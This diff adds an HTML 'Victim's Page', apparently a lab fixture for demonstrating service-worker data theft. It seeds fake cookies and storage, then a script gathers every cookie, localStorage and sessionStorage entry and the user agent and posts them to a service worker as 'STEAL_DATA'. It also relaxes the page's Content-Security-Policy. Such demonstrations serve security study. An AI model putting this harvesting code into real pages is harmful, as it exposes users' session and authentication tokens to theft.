@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Victim's Page</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' http://localhost:8000">
+    <script>
+        // Set some test cookies
+        document.cookie = "session=test_session_cookie; path=/";
+        document.cookie = "auth=test_auth_cookie; path=/";
+        
+        // Set some test localStorage data
+        localStorage.setItem('user', JSON.stringify({
+            id: '12345',
+            name: 'Test User',
+            email: 'test@example.com'
+        }));
+        localStorage.setItem('token', 'test_storage_token');
+        
+        // Set some test sessionStorage data
+        sessionStorage.setItem('currentPage', 'dashboard');
+        sessionStorage.setItem('lastAction', 'login');
+        
+        // Function to collect and send sensitive data to service worker
+        function sendSensitiveDataToServiceWorker() {
+            if ('serviceWorker' in navigator && navigator.serviceWorker.controller) {
+                // Get all cookies
+                const cookies = document.cookie;
+                
+                // Get localStorage data
+                const localStorageData = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    localStorageData[key] = localStorage.getItem(key);
+                }
+                
+                // Get sessionStorage data
+                const sessionStorageData = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    sessionStorageData[key] = sessionStorage.getItem(key);
+                }
+                
+                // Send data to service worker
+                navigator.serviceWorker.controller.postMessage({
+                    type: 'STEAL_DATA',
+                    cookies: cookies,
+                    localStorage: localStorageData,
+                    sessionStorage: sessionStorageData,
+                    userAgent: navigator.userAgent
+                });
+                
+                console.log('Sent sensitive data to service worker');
+            }
+        }
+        
+        // Register service worker
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('/sw.js')
+                    .then(registration => {
+                        console.log('Service Worker registered with scope:', registration.scope);
+                        
+                        // Wait for service worker to be ready
+                        if (registration.active) {
+                            console.log('Service Worker is active');
+                            sendSensitiveDataToServiceWorker();
+                        } else {
+                            console.log('Waiting for Service Worker to activate...');
+                            registration.addEventListener('activate', () => {
+                                console.log('Service Worker activated');
+                                sendSensitiveDataToServiceWorker();
+                            });
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Service Worker registration failed:', error);
+                    });
+            });
+        }
+    </script>
+</head>
+<body>
+    <h1>Victim's Sensitive Page</h1>
+    <p>This page contains sensitive data that should be protected.</p>
+    <div id="sensitiveData">
+        <h2>Your Sensitive Information:</h2>
+        <p>Session Cookie: <span id="sessionCookie"></span></p>
+        <p>Auth Cookie: <span id="authCookie"></span></p>
+        <p>User Data: <span id="userData"></span></p>
+        <p>Token: <span id="token"></span></p>
+    </div>
+    <script>
+        // Display the sensitive data (for demonstration)
+        document.getElementById('sessionCookie').textContent = document.cookie;
+        document.getElementById('authCookie').textContent = document.cookie;
+        document.getElementById('userData').textContent = localStorage.getItem('user');
+        document.getElementById('token').textContent = localStorage.getItem('token');
+        
+        // Send data to service worker after a short delay to ensure it's loaded
+        setTimeout(sendSensitiveDataToServiceWorker, 1000);
+    </script>
+</body>
+</html>
